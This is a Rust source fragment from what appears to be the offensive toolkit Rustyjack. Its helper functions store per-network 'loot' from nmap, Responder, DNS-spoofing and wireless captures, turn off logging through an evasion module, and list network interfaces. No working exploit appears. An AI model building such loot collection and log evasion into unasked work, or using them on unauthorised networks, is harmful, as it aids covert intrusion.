fn write_scoped_log(
    root: &Path,
    scope: &str,
    target: &str,
    action: &str,
    hint: &str,
    lines: &[String],
) -> Option<PathBuf> {
    if rustyjack_evasion::logs_disabled() || lines.is_empty() {
        return None;
    }
    let dir = scoped_log_dir(root, scope, target, action)?;
    let fname = format!(
        "{}_{}.log",
        sanitize_label(hint),
        Local::now().format("%Y%m%d_%H%M%S")
    );
    let path = dir.join(fname);
    if let Ok(mut file) = fs::File::create(&path) {
        for line in lines {
            let _ = writeln!(file, "{line}");
        }
        Some(path)
    } else {
        None
    }
}

/// Build a per-network loot directory under loot/Wireless/<safe_name>
/// Falls back to BSSID, then "Unknown" if nothing provided.
fn wireless_target_directory(root: &Path, ssid: Option<String>, bssid: Option<String>) -> PathBuf {
    let make_safe = |s: &str| {
        let mut out = String::with_capacity(s.len());
        for ch in s.chars() {
            if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
                out.push(ch);
            } else {
                out.push('_');
            }
        }
        let trimmed = out.trim_matches('_').to_string();
        if trimmed.is_empty() {
            "Unknown".to_string()
        } else {
            trimmed
        }
    };

    let name = ssid
        .as_ref()
        .map(|s| s.as_str())
        .filter(|s| !s.is_empty())
        .map(|s| make_safe(s))
        .or_else(|| {
            bssid
                .as_ref()
                .map(|b| b.as_str())
                .filter(|b| !b.is_empty())
                .map(|b| make_safe(b))
        })
        .unwrap_or_else(|| "Unknown".to_string());

    root.join("loot").join("Wireless").join(name)
}

fn loot_kind_label(kind: LootKind) -> &'static str {
    match kind {
        LootKind::Nmap => "nmap",
        LootKind::Responder => "responder",
        LootKind::Dnsspoof => "dnsspoof",
        LootKind::Ethernet => "ethernet",
        LootKind::Wireless => "wireless",
    }
}

fn resolve_loot_path(root: &Path, path: &Path) -> Result<PathBuf> {
    let candidate = if path.is_absolute() {
        path.to_path_buf()
    } else {
        root.join(path)
    };
    let canonical = candidate
        .canonicalize()
        .with_context(|| format!("resolving {}", path.display()))?;
    if !canonical.starts_with(root) {
        bail!("Path {} is outside the Rustyjack root", canonical.display());
    }
    Ok(canonical)
}

fn handle_hardware_detect() -> Result<HandlerResult> {
    log::info!("Scanning hardware interfaces");

    let interfaces = list_interface_summaries()?;

    // Categorize interfaces
    let mut ethernet_ports = Vec::new();
    let mut wifi_modules = Vec::new();
    let mut other_interfaces = Vec::new();

    for iface in &interfaces {
        // Skip loopback
        if iface.name == "lo" {
            continue;
        }

        match iface.kind.as_str() {
            "wireless" => wifi_modules.push(iface.clone()),
            "wired" => {
                // Only count ethernet if it's eth* or en*
                if iface.name.starts_with("eth") || iface.name.starts_with("en") {
                    ethernet_ports.push(iface.clone());
                } else {
                    other_interfaces.push(iface.clone());
                }
            }
            _ => other_interfaces.push(iface.clone()),
        }
    }

    let data = json!({
        "ethernet_count": ethernet_ports.len(),
        "wifi_count": wifi_modules.len(),
        "other_count": other_interfaces.len(),
        "ethernet_ports": ethernet_ports,
        "wifi_modules": wifi_modules,
        "other_interfaces": other_interfaces,
        "total_interfaces": interfaces.len() - 1, // Exclude loopback
    });

    let summary = format!(
        "Found {} ethernet, {} wifi, {} other",
        ethernet_ports.len(),
        wifi_modules.len(),
        other_interfaces.len()
    );

    log::info!("Hardware scan complete: {summary}");
    Ok((summary, data))
}
